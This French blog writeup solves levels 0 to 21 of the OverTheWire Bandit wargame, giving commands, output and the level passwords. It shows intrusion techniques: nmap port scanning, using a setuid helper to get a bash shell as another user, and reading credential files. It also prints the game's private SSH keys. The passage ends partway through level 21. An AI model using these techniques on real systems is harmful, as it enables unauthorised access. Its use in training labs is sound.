---
title: "Solution du Wargame Bandit de OverTheWire"
tags: [CTF, OverTheWire]
---

[Bandit](https://overthewire.org/wargames/bandit/) est l'un des wargames proposés sur le vénérable *OverTheWire*.

Il permet surtout de se familiariser avec Unix. Il était temps de se fendre d'un petit writeup.

## Level 0

Il s'agit surtout ici de découvrir à quoi on a affaire. Le site nous fournit des identifiants pour la connexion SSH. On accède au premier compte de cette façon :

```bash
ssh -p 2220 bandit0@bandit.labs.overthewire.org
```



```console
bandit0@bandit:~$ cat readme 
NH2SXQwcBdpmTEzi3bvBHMM9H66vVXjL
bandit0@bandit:~$ ls -al /etc/bandit_pass/bandit1
-r-------- 1 bandit1 bandit1 33 Apr 23 18:04 /etc/bandit_pass/bandit1
```

Chaque level a son propre fichier de mot de passe dans `/etc/bandit_pass/`. Ici nous avons l'utilisateur `bandit0` et seul `bandit1` peut lire son propre mot de passe.

Il y a une méthode attendue pour obtenir le mot de passe, ici il suffisait de lire le fichier `readme`.

## Level 1

On peut alors se connecter en SSH sur l'autre compte :

```console
bandit1@bandit:~$ ls
-
bandit1@bandit:~$ cat ./-
rRGizSaX8Mk1RTb1CNQoXTcYZWU6lgzi
```

Il y a un fichier dont le nom commence par un tiret. C'est une blague classique qu'on fait aux débutants sous Unix (idem avec `*`) car le tiret est habituellement interprété par la commande. Préfixer de `./` permet de spécifier le nom correctement mais il y a d'autres techniques.

## Level 2

Même chose, mais avec des espaces dans le nom de fichier :

```console
bandit2@bandit:~$ ls
spaces in this filename
bandit2@bandit:~$ cat "spaces in this filename" 
aBZ0W5EmUfAf7kHTQeOwd8bauFJ2lAiG
```

## Level 3

Ici seulement un fichier caché :

```console
bandit3@bandit:~$ find . -type f
./.profile
./inhere/.hidden
./.bashrc
./.bash_logout
bandit3@bandit:~$ cat ./inhere/.hidden
2EW7BBsr6aMMoJ2HjW067dm8EgX26xNe
```

## Level 4

On a différents fichiers dans le dossier `inhere` mais seul un contient un mot de passe. On peut utiliser la commande `file` pour déterminer la nature de chacun des fichiers :

```console
bandit4@bandit:~$ ls inhere/
-file00  -file01  -file02  -file03  -file04  -file05  -file06  -file07  -file08  -file09
bandit4@bandit:~$ file inhere/*
inhere/-file00: data
inhere/-file01: data
inhere/-file02: data
inhere/-file03: data
inhere/-file04: data
inhere/-file05: data
inhere/-file06: data
inhere/-file07: ASCII text
inhere/-file08: data
inhere/-file09: Non-ISO extended-ASCII text, with no line terminators
bandit4@bandit:~$ cat inhere/-file07
lrIWWI6bB37kxfiCQZqUdOIYfr6eEeqR
```

## Level 5

Cette fois, on a beaucoup de fichiers, faire le tri va être difficile. Il faut cette fois lire les instructions sur le site pour déterminer ce qu'il faut faire :

> The password for the next level is stored in a file somewhere under the **inhere** directory and has all of the following properties:
> 
> - human-readable
> - 1033 bytes in size
> - not executable

Avec la commande `find` on peut filtrer par taille du fichier :

```console
bandit5@bandit:~$ find inhere/ -type f -size 1033c
inhere/maybehere07/.file2
bandit5@bandit:~$ cat inhere/maybehere07/.file2
P4L4vucdmLnm8I7Vl7jG1ApGSfjYKqJU
```

## Level 6

Opération classique d'un CTF : trouver les fichiers appartenant à un utilisateur donné. Ici l'utilisateur a mis son mot de passe dans un fichier à un emplacement improbable.

```console
bandit6@bandit:~$ find / -user bandit7 -ls 2> /dev/null | grep -v /sys
    77144      4 -rw-r-----   1 bandit7  bandit6        33 Apr 23 18:04 /var/lib/dpkg/info/bandit7.password
   280379      4 -r--------   1 bandit7  bandit7        33 Apr 23 18:04 /etc/bandit_pass/bandit7
       68      0 crw--w----   1 bandit7  tty      136,  65 Apr 27 09:18 /dev/pts/65
        1      0 drwx------   4 bandit7  bandit7       140 Apr 27 07:22 /run/user/11007
bandit6@bandit:~$ cat /var/lib/dpkg/info/bandit7.password
z7WtoNQU2XfjmMtWA8u5rN4vzqu4v99S
```

## Level 7

> The password for the next level is stored in the file **data.txt** next to the word **millionth**

Sans commentaires

```console
bandit7@bandit:~$ grep millionth data.txt 
millionth       TESKZC0XvTetK0S9xNwm25STk5iWrBvP
```

## Level 8

> The password for the next level is stored in the file **data.txt** and is the only line of text that occurs only once

`sort` pour trier, `uniq` pour regrouper et compter, `sort` pour trier par apparition :

```console
bandit8@bandit:~$ sort data.txt | uniq -c | sort -n | head
      1 EN632PlfYiZbn3PhVK3XOGSlNInNE00t
     10 08Jd2vmb6FjR4zXPteGHhpJm8A0OOA5B
     10 0dEKX1sDwYtc4vyjrKpGu30ecWBsDDa9
     10 0YDTDPCLc585IaFu911ukE9QfD6Ykrlz
     10 0zP9wfUcMKjZM2hiQUYR1nTfmaRdYSQE
     10 11FFcDRW5ZXXmX7geZORYRwiJfj8B3Gh
     10 1jZv2X1O2JypCBIgDNRwWQzS1CyhvByt
     10 1MUdfR7bGGCpNfGEOXaIEdrA8hT2L8Tk
     10 2fepTygKSkWHQJS2GrmGwjyl36eXSWJe
     10 3cTCUFe6MTl1FDAL0Z49cRByfq1MRlxJ
```

## Level 9

> The password for the next level is stored in the file **data.txt** in one of the few human-readable strings, preceded by several ‘=’ characters.

Je m'attendais à trouver le mot de passe en début d'une ligne, mais en fait nom. Un `grep` avec une expression régulière fonctionne. On passe l'option `-a` pour que le fichier soit traité comme du texte.

```console
bandit9@bandit:~$ grep -a '==.*[a-zA-Z0-9]$' data.txt 
�*D���f��C�4��U��▒t��*�����R�+�د"�\�fXqk{~���   ܥ`�0%�Q�Xde����5�朁��O�5�3��J�d�ݜ���0�yU        `�Ҽ�4�c)Gv�<���[����o��m
�H]+�D���~��"��9��1t��*�b��K�ʫ������t�o��<�.��"�g˘JH)���l&���=������*����R-�C�========== G7w8LIi6J3kTb8A7j9LgrywtEUlyyp6s
```

Ou avec Python :

```python
bandit9@bandit:~$ python3
Python 3.10.6 (main, Mar 10 2023, 10:55:28) [GCC 11.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import re
>>> buff = open("data.txt", "rb").read()
>>> re.search(rb"[a-zA-Z0-9]{32}", buff)
<re.Match object; span=(16201, 16233), match=b'G7w8LIi6J3kTb8A7j9LgrywtEUlyyp6s'>
```

## Level 10

Le fichier est seulement encodé en base64 :

```console
bandit10@bandit:~$ cat data.txt | base64 -d
The password is 6zPeziLdR2RKNdNYFNb6nVCKzphlXHBM
```

## Level 11

Cette fois, c'est du ROT13 (décalage de 13 positions dans l'alphabet) :

```console
bandit11@bandit:~$ cat data.txt 
Gur cnffjbeq vf WIAOOSFzMjXXBC0KoSKBbJ8puQm5lIEi
bandit11@bandit:~$ cat data.txt | tr 'n-za-mN-ZA-M' 'a-zA-Z'
The password is JVNBBFSmZwKKOP0XbFXOoW8chDz5yVRv
```

## Level 12

Celui-ci était un peu laborieux. On part d'un dump hexa généré par `hexdump -C` ou `xxd` :

```console
bandit12@bandit:~$ cat data.txt 
00000000: 1f8b 0808 2773 4564 0203 6461 7461 322e  ....'sEd..data2.
00000010: 6269 6e00 0145 02ba fd42 5a68 3931 4159  bin..E...BZh91AY
00000020: 2653 597b 4f96 5f00 0018 ffff fd6f e7ed  &SY{O._......o..
00000030: bff7 bef7 9fdb d7ca ffbf edff 8ded dfd7  ................
00000040: bfe7 bbff bfdb fbff ffbf ff9f b001 3b56  ..............;V
--- snip ---
```

Une fois le fichier reconstruit on obtient un fichier compressé qui s'avère contenir un autre fichier compressé puis une archive tar, etc. Enfin on parvient par obtenir le mot de passe.

```console
bandit12@bandit:~$ cat data.txt | xxd -r > /tmp/out
bandit12@bandit:~$ file /tmp/out
/tmp/out: gzip compressed data, was "data2.bin", last modified: Sun Apr 23 18:04:23 2023, max compression, from Unix, original size modulo 2^32 581
bandit12@bandit:~$ cd /tmp; mv out data2.bin.gz; gunzip data2.bin.gz
bandit12@bandit:/tmp$ file data2.bin
data2.bin: bzip2 compressed data, block size = 900k
bandit12@bandit:/tmp$ mv data2.bin out.bz2
bandit12@bandit:/tmp$ bunzip2 out.bz2
bandit12@bandit:/tmp$ file out
out: gzip compressed data, was "data4.bin", last modified: Sun Apr 23 18:04:23 2023, max compression, from Unix, original size modulo 2^32 20480
bandit12@bandit:/tmp$ mv out data4.bin.gz
bandit12@bandit:/tmp$ gunzip data4.bin.gz
bandit12@bandit:/tmp$ file data4.bin
data4.bin: POSIX tar archive (GNU)
bandit12@bandit:/tmp$ tar xvf data4.bin
data5.bin
bandit12@bandit:/tmp$ file data5.bin
data5.bin: POSIX tar archive (GNU)
bandit12@bandit:/tmp$ tar xvf data5.bin
data6.bin
bandit12@bandit:/tmp$ file data6.bin
data6.bin: bzip2 compressed data, block size = 900k
bandit12@bandit:/tmp$ mv data6.bin data6.bin.bz2; bunzip2 data6.bin.bz2
bandit12@bandit:/tmp$ file data6.bin
data6.bin: POSIX tar archive (GNU)
bandit12@bandit:/tmp$ tar xvf data6.bin
data8.bin
bandit12@bandit:/tmp$ file data8.bin
data8.bin: gzip compressed data, was "data9.bin", last modified: Sun Apr 23 18:04:23 2023, max compression, from Unix, original size modulo 2^32 49
bandit12@bandit:/tmp$ mv data8.bin data8.bin.gz
bandit12@bandit:/tmp$ gunzip data8.bin.gz
bandit12@bandit:/tmp$ file data8.bin
data8.bin: ASCII text
bandit12@bandit:/tmp$ cat data8.bin
The password is wbWdlBxEir4CaE8LaPhauuOo6pwRmrDw
```

## Level 13

```console
bandit13@bandit:~$ ls
sshkey.private
bandit13@bandit:~$ cat sshkey.private
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAxkkOE83W2cOT7IWhFc9aPaaQmQDdgzuXCv+ppZHa++buSkN+
gg0tcr7Fw8NLGa5+Uzec2rEg0WmeevB13AIoYp0MZyETq46t+jk9puNwZwIt9XgB
ZufGtZEwWbFWw/vVLNwOXBe4UWStGRWzgPpEeSv5Tb1VjLZIBdGphTIK22Amz6Zb
ThMsiMnyJafEwJ/T8PQO3myS91vUHEuoOMAzoUID4kN0MEZ3+XahyK0HJVq68KsV
ObefXG1vvA3GAJ29kxJaqvRfgYnqZryWN7w3CHjNU4c/2Jkp+n8L0SnxaNA+WYA7
jiPyTF0is8uzMlYQ4l1Lzh/8/MpvhCQF8r22dwIDAQABAoIBAQC6dWBjhyEOzjeA
J3j/RWmap9M5zfJ/wb2bfidNpwbB8rsJ4sZIDZQ7XuIh4LfygoAQSS+bBw3RXvzE
pvJt3SmU8hIDuLsCjL1VnBY5pY7Bju8g8aR/3FyjyNAqx/TLfzlLYfOu7i9Jet67
xAh0tONG/u8FB5I3LAI2Vp6OviwvdWeC4nOxCthldpuPKNLA8rmMMVRTKQ+7T2VS
nXmwYckKUcUgzoVSpiNZaS0zUDypdpy2+tRH3MQa5kqN1YKjvF8RC47woOYCktsD
o3FFpGNFec9Taa3Msy+DfQQhHKZFKIL3bJDONtmrVvtYK40/yeU4aZ/HA2DQzwhe
ol1AfiEhAoGBAOnVjosBkm7sblK+n4IEwPxs8sOmhPnTDUy5WGrpSCrXOmsVIBUf
laL3ZGLx3xCIwtCnEucB9DvN2HZkupc/h6hTKUYLqXuyLD8njTrbRhLgbC9QrKrS
M1F2fSTxVqPtZDlDMwjNR04xHA/fKh8bXXyTMqOHNJTHHNhbh3McdURjAoGBANkU
1hqfnw7+aXncJ9bjysr1ZWbqOE5Nd8AFgfwaKuGTTVX2NsUQnCMWdOp+wFak40JH
PKWkJNdBG+ex0H9JNQsTK3X5PBMAS8AfX0GrKeuwKWA6erytVTqjOfLYcdp5+z9s
8DtVCxDuVsM+i4X8UqIGOlvGbtKEVokHPFXP1q/dAoGAcHg5YX7WEehCgCYTzpO+
xysX8ScM2qS6xuZ3MqUWAxUWkh7NGZvhe0sGy9iOdANzwKw7mUUFViaCMR/t54W1
GC83sOs3D7n5Mj8x3NdO8xFit7dT9a245TvaoYQ7KgmqpSg/ScKCw4c3eiLava+J
3btnJeSIU+8ZXq9XjPRpKwUCgYA7z6LiOQKxNeXH3qHXcnHok855maUj5fJNpPbY
iDkyZ8ySF8GlcFsky8Yw6fWCqfG3zDrohJ5l9JmEsBh7SadkwsZhvecQcS9t4vby
9/8X4jS0P8ibfcKS4nBP+dT81kkkg5Z5MohXBORA7VWx+ACohcDEkprsQ+w32xeD
qT1EvQKBgQDKm8ws2ByvSUVs9GjTilCajFqLJ0eVYzRPaY6f++Gv/UVfAPV4c+S0
kAWpXbv5tbkkzbS0eaLPTKgLzavXtQoTtKwrjpolHKIHUz6Wu+n4abfAIRFubOdN
/+aLoRQ0yBDRbdXMsZN/jvY44eM+xRLdRVyMmdPtP8belRi2E2aEzA==
-----END RSA PRIVATE KEY-----
```

C'est juste pour se familiariser avec les clés SSH. Il faut faire un `chmod 600` sur la clé avant de l'utiliser.

```bash
ssh -p 2220 -i bandit14.key bandit14@bandit.labs.overthewire.org
```

## Level 14

> The password for the next level can be retrieved by submitting the password of the current level to **port 30000 on localhost**.

Ici on se familiarise avec `netcat`. `Ncat` est aussi présent sur la machine.

```console
bandit14@bandit:~$ cat /etc/bandit_pass/bandit14 | nc localhost 30000
Correct!
jN2kgmIXJ6fShzhT2avhotn4Zcka6tnt
```

## Level 15

> The password for the next level can be retrieved by submitting the password of the current level to **port 30001 on localhost** using SSL encryption.
> 
> **Helpful note: Getting “HEARTBEATING” and “Read R BLOCK”? Use -ign_eof and read the “CONNECTED COMMANDS” section in the manpage. Next to ‘R’ and ‘Q’, the ‘B’ command also works in this version of that command…**

On a juste un port derrière du SSL. J'ai utilisé directement `openssl` mais `Ncat` aurait fait l'affaire.

```console
bandit15@bandit:~$ openssl s_client -connect localhost:30001
CONNECTED(00000003)
Can't use SSL_get_servername
depth=0 CN = localhost
verify error:num=18:self-signed certificate
verify return:1
depth=0 CN = localhost
verify error:num=10:certificate has expired
notAfter=Apr 26 00:56:39 2023 GMT
verify return:1
depth=0 CN = localhost
notAfter=Apr 26 00:56:39 2023 GMT
verify return:1
---
Certificate chain
 0 s:CN = localhost
   i:CN = localhost
   a:PKEY: rsaEncryption, 2048 (bit); sigalg: RSA-SHA1
   v:NotBefore: Apr 26 00:55:39 2023 GMT; NotAfter: Apr 26 00:56:39 2023 GMT
---
Server certificate
-----BEGIN CERTIFICATE-----
MIIDCzCCAfOgAwIBAgIEFFcfiTANBgkqhkiG9w0BAQUFADAUMRIwEAYDVQQDDAls
b2NhbGhvc3QwHhcNMjMwNDI2MDA1NTM5WhcNMjMwNDI2MDA1NjM5WjAUMRIwEAYD
VQQDDAlsb2NhbGhvc3QwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDp
Ku7a5QH2R4bSv0k410iSq1UOCSI4VPcsxctPdeHGvI/RVnkCYJkgubm9ultnpYew
rdlYSpJLskpoQANI/wkGhwMF9LOswUCpLCwr3gvkknU9tr92vNKPdkfLEJn1Pup+
MwKGnLZ2ZzNzC5JOu+IzHiRssfHhP9aMJaFjJwD0eEfOIh2t0cIblMFB3Gzk2FrI
uEDePfAmxXg/Qp4dgatbyM6I6rn/9UzEb5mIjw22kN5OjBp9DO+repcK5hQtJbXO
FdyK4cGz/Ds7Aoec+ifBfskEsGoQ+0dVJfs3bOcvrjfnE47TsUFsmwePkDdlk+Si
MrvhYede0UOkdsfHOPjrAgMBAAGjZTBjMBQGA1UdEQQNMAuCCWxvY2FsaG9zdDBL
BglghkgBhvhCAQ0EPhY8QXV0b21hdGljYWxseSBnZW5lcmF0ZWQgYnkgTmNhdC4g
U2VlIGh0dHBzOi8vbm1hcC5vcmcvbmNhdC8uMA0GCSqGSIb3DQEBBQUAA4IBAQCC
ucE91DmhCTTF+oGBHkg8SD21iJ9+5TT3hYcln9cwyOfF47MNV8Bi6zKpyE5JTTU2
gYDe8144nUyi5Yo54z2oo7mQYSAfMFl2azgRfRXEDNhfnTvPBI3tjuIgHcQXPSIP
u9vFIvHEF41wnbZjHhWPdvDidnWJP2SQ4Rxrrl1ZW3uf3YaoQV2iKpQzrUFFKUO0
PUZtjce7zSn3GpWpCJxuz0dSNf9RVW8qfIE3VRW96I9Kfhk74ozw4YOTLpLCkcMK
80iqEWsojaplcievflEAwHikjZbSib1eugNpVJIWlUEOr52Wrbi4Ib6/v5khhlBt
AUV7MeIAqxsrUfT720GY
-----END CERTIFICATE-----
subject=CN = localhost
issuer=CN = localhost
---
No client certificate CA names sent
Peer signing digest: SHA256
Peer signature type: RSA-PSS
Server Temp Key: X25519, 253 bits
---
SSL handshake has read 1339 bytes and written 373 bytes
Verification error: certificate has expired
---
New, TLSv1.3, Cipher is TLS_AES_256_GCM_SHA384
Server public key is 2048 bit
Secure Renegotiation IS NOT supported
Compression: NONE
Expansion: NONE
No ALPN negotiated
Early data was not sent
Verify return code: 10 (certificate has expired)
---
---
Post-Handshake New Session Ticket arrived:
SSL-Session:
    Protocol  : TLSv1.3
    Cipher    : TLS_AES_256_GCM_SHA384
    Session-ID: 9CEB75DECB7FD7DABB2BCA9E6B880F198E8605D1231889BD314FCE25F03EB937
    Session-ID-ctx: 
    Resumption PSK: D8043EE60818F69D80AD34813A615FE47EC84A2BEEE27FD03A9054BB43661049BF75C806805B4416537B918B14B26B74
    PSK identity: None
    PSK identity hint: None
    SRP username: None
    TLS session ticket lifetime hint: 7200 (seconds)
    TLS session ticket:
    0000 - 65 99 98 87 ff 71 4a 70-7c e7 20 71 00 d7 9a 9d   e....qJp|. q....
    0010 - 8f 33 65 a7 2c ad 06 75-0f 1c 93 cc 2b e2 e8 ff   .3e.,..u....+...
    0020 - de 92 c0 74 49 ed a5 62-15 a9 20 ab 20 75 bf 93   ...tI..b.. . u..
    0030 - ac 19 45 43 dd 51 d3 97-1c 2c 23 50 b9 fc af c0   ..EC.Q...,#P....
    0040 - 51 f3 3d cd ae e4 b7 a1-89 cd 46 25 8e 55 01 04   Q.=.......F%.U..
    0050 - bd 15 ed 6a 51 b2 7b c9-a2 74 8a d1 48 b4 35 67   ...jQ.{..t..H.5g
    0060 - 3f 5f 3a 80 e3 0e e0 13-de 90 79 89 7d a2 20 90   ?_:.......y.}. .
    0070 - d2 6d 7f 2f f3 f3 fb 10-f5 a1 68 3d ce 45 2f 6a   .m./......h=.E/j
    0080 - b9 60 f0 51 c7 bd 4c 32-0d 46 14 f0 82 02 f7 aa   .`.Q..L2.F......
    0090 - 13 02 ae 95 33 20 f0 f6-82 7a f4 8a 49 24 c9 12   ....3 ...z..I$..
    00a0 - c2 0b 54 49 e5 ce 84 dc-53 5b a4 0b ae 2e d8 71   ..TI....S[.....q
    00b0 - 97 9b 5a ca b1 86 8f 31-60 e2 2e 86 71 13 0c 58   ..Z....1`...q..X
    00c0 - 0c 5e c0 a7 6f 1d 44 8a-9d 61 33 79 bf 56 34 a7   .^..o.D..a3y.V4.

    Start Time: 1682597260
    Timeout   : 7200 (sec)
    Verify return code: 10 (certificate has expired)
    Extended master secret: no
    Max Early Data: 0
---
read R BLOCK
---
Post-Handshake New Session Ticket arrived:
SSL-Session:
    Protocol  : TLSv1.3
    Cipher    : TLS_AES_256_GCM_SHA384
    Session-ID: 0E8FB69A94E9CEE8F2EE4BD6D3D8EFB7945CD2C2DFB377436E5BED9BD29F1480
    Session-ID-ctx: 
    Resumption PSK: 7615D3AC2622F6DCDFF8DDD6FAB6AC5ADF42BD0BEE75CC25F82FAD6214135199CCDE7536BE3E1E7679A2DBF97C25AB0F
    PSK identity: None
    PSK identity hint: None
    SRP username: None
    TLS session ticket lifetime hint: 7200 (seconds)
    TLS session ticket:
    0000 - 65 99 98 87 ff 71 4a 70-7c e7 20 71 00 d7 9a 9d   e....qJp|. q....
    0010 - 4c 82 98 c4 a4 db a7 26-be 0d b8 63 8a 5d 7a d2   L......&...c.]z.
    0020 - 19 40 e6 7d e8 af 61 c1-3e b2 ed e4 c9 ef 4c d0   .@.}..a.>.....L.
    0030 - 74 85 db f8 bb 35 3a 10-41 4c 1d 86 16 eb 1d 57   t....5:.AL.....W
    0040 - 04 e8 4a 19 f6 77 ab fa-d6 d4 f7 e7 a7 2c d2 9d   ..J..w.......,..
    0050 - d5 69 e2 be 49 e2 9a cb-6f e4 a8 74 4e e8 fa 71   .i..I...o..tN..q
    0060 - b3 67 e5 37 c4 e6 07 7f-29 44 22 3c 51 63 3d a2   .g.7....)D"<Qc=.
    0070 - 3a 85 98 0f 52 d5 9f d2-b0 ba d0 90 30 05 da 53   :...R.......0..S
    0080 - 43 4f c6 8b 34 fb b6 6c-71 bc cd 54 af 18 cd 20   CO..4..lq..T... 
    0090 - 3d a4 64 b8 6e 68 17 77-da c7 2a e6 eb bb 84 b4   =.d.nh.w..*.....
    00a0 - 31 6e b6 79 03 70 90 92-b0 fe c3 ad 7c 7b 1c 1f   1n.y.p......|{..
    00b0 - 35 81 ab eb dc b8 94 19-99 65 19 ff 9c a5 22 39   5........e...."9
    00c0 - bb 05 10 54 d2 8f 88 1a-dd 26 0d cb 37 7c 89 23   ...T.....&..7|.#

    Start Time: 1682597260
    Timeout   : 7200 (sec)
    Verify return code: 10 (certificate has expired)
    Extended master secret: no
    Max Early Data: 0
---
read R BLOCK
jN2kgmIXJ6fShzhT2avhotn4Zcka6tnt
Correct!
JQttfApK4SeyHwDlI9SXGR50qclOAil1

closed
```

## Level 16

> The credentials for the next level can be retrieved by submitting the password of the current level to **a port on localhost in the range 31000 to 32000**. First find out which of these ports have a server listening on them. Then find out which of those speak SSL and which don’t. There is only 1 server that will give the next credentials, the others will simply send back to you whatever you send to it.

`Nmap` avec l'option `-sV` devrait être en mesure d'identifier un peu ces ports :

```console
bandit16@bandit:~$ nmap -sV -p31000-32000 --open -T5 localhost
Starting Nmap 7.80 ( https://nmap.org ) at 2023-04-27 12:09 UTC
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00010s latency).
Not shown: 996 closed ports
PORT      STATE SERVICE     VERSION
31046/tcp open  echo
31518/tcp open  ssl/echo
31691/tcp open  echo
31790/tcp open  ssl/unknown
31960/tcp open  echo
```

Ceux marqués comme `echo` nous renvoient notre texte, c'est donc le port 31790 qui nous intéresse.

```console
bandit16@bandit:~$ ncat --ssl localhost 31790
JQttfApK4SeyHwDlI9SXGR50qclOAil1
Correct!
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJ
imZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQ
Ja6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTu
DSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbW
JGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNX
x0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvD
KHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBl
J9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovd
d8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nC
YNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8A
vLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama
+TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT
8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnx
SatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHd
HCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+Exdvt
SghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0A
R57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDi
Ttiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCg
R8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiu
L8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Ni
blh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkU
YOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM
77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0b
dxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3
vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=
-----END RSA PRIVATE KEY-----
```

## Level 17

On a un fichier de vieux mots de passe et un fichier de nouveaux mots de passe. On regarde les changements avec `diff` :

```console
bandit17@bandit:~$ ls -l
total 8
-rw-r----- 1 bandit18 bandit17 3300 Apr 23 18:04 passwords.new
-rw-r----- 1 bandit18 bandit17 3300 Apr 23 18:04 passwords.old
bandit17@bandit:~$ file passwords.*
passwords.new: ASCII text
passwords.old: ASCII text
bandit17@bandit:~$ diff passwords.old passwords.new
42c42
< glZreTEH1V3cGKL6g4conYqZqaEj0mte
---
> hga5tuuCLF6fFzUpnagiMN8ssu9LFrdg
```

Sur la dernière ligne de l'output se trouve le nouveau mot de passe.

## Level 18

A la connexion via ssh on se fait éjecter :

> Byebye !  
> Connection to bandit.labs.overthewire.org closed.

On peut spécifier le shell via la commande SSH :

```console
$ ssh -p 2220 bandit18@bandit.labs.overthewire.org /bin/bash
                         _                     _ _ _   
                        | |__   __ _ _ __   __| (_) |_ 
                        | '_ \ / _` | '_ \ / _` | | __|
                        | |_) | (_| | | | | (_| | | |_ 
                        |_.__/ \__,_|_| |_|\__,_|_|\__|
                                                       

                      This is an OverTheWire game server. 
            More information on http://www.overthewire.org/wargames

bandit18@bandit.labs.overthewire.org's password: 
id
uid=11018(bandit18) gid=11018(bandit18) groups=11018(bandit18)
ls
readme
cat readme
awhqfNnAbc1naukrpqDYcF95h7HoMTrC
```

## Level 19

```console
bandit19@bandit:~$ ls -al bandit20-do 
-rwsr-x--- 1 bandit20 bandit19 14876 Apr 23 18:04 bandit20-do
bandit19@bandit:~$ strings bandit20-do
tdL 
/lib/ld-linux.so.2
_IO_stdin_used
exit
__libc_start_main
execv
printf
libc.so.6
GLIBC_2.0
GLIBC_2.34
__gmon_start__
Run a command as another user.
  Example: %s id
/usr/bin/env
--- snip ---
```

Il s'agit d'une introduction aux binaires setuid. On peut exécuter des commandes avec les privilèges (effective UID) de l'utilisateur `bandit20`.

```console
bandit19@bandit:~$ ./bandit20-do bash -p
bash-5.1$ id
uid=11019(bandit19) gid=11019(bandit19) euid=11020(bandit20) groups=11019(bandit19)
bash-5.1$ cat /etc/bandit_pass/bandit20
VxCazJaVykI6W36BkBU0mJTCM8rR95XT
```

## Level 20

> There is a setuid binary in the homedirectory that does the following: it makes a connection to localhost on the port you specify as a commandline argument. It then reads a line of text from the connection and compares it to the password in the previous level (bandit20). If the password is correct, it will transmit the password for the next level (bandit21).

On doit mettre en écoute un port qui servira le mot de passe de `bandit20` puis utiliser le binaire setuid qui va se connecter au port et nous donner le mot de passe de `bandit21` si celui de `bandit20` est vérifié.

Il y a des façons plus simples et propres de faire ça (seconde connexion SSH, screen, tmux, etc). Moi j'ai mis en background le listener (`Ctrl+Z`), lancé le binaire, revenu au premier (avec la commande `fg` qui remet en foreground), etc .

```console
bandit20@bandit:~$ cat /etc/bandit_pass/bandit20 | ncat -l -p 9999 -v
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::9999
Ncat: Listening on 0.0.0.0:9999
^Z
[1]+  Stopped                 cat /etc/bandit_pass/bandit20 | ncat -l -p 9999 -v
bandit20@bandit:~$ ./suconnect 9999
^Z
[2]+  Stopped                 ./suconnect 9999
bandit20@bandit:~$ fg 1
cat /etc/bandit_pass/bandit20 | ncat -l -p 9999 -v
Ncat: Connection from 127.0.0.1.
Ncat: Connection from 127.0.0.1:38802.
^Z
[1]+  Stopped                 cat /etc/bandit_pass/bandit20 | ncat -l -p 9999 -v
bandit20@bandit:~$ fg 2
./suconnect 9999
Read: VxCazJaVykI6W36BkBU0mJTCM8rR95XT
Password matches, sending next password
bandit20@bandit:~$ fg 1
cat /etc/bandit_pass/bandit20 | ncat -l -p 9999 -v
NvEJF7oVjkddltPSrdKEFOllh9V1IBcq
```

## Level 21

> A program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in **/etc/cron.d/** for the configuration and see what command is being executed.

Cette fois, on s'initie aux tâches planifiées. La tâche écrit le mot de passe dans un fichier au nom improbable :

```console
bandit21@bandit:~$ cat /etc/cron.d/cronjob_bandit22
@reboot bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
bandit21@bandit:~$ cat /usr/bin/cronjob_bandit22.sh
#!/bin/bash
chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
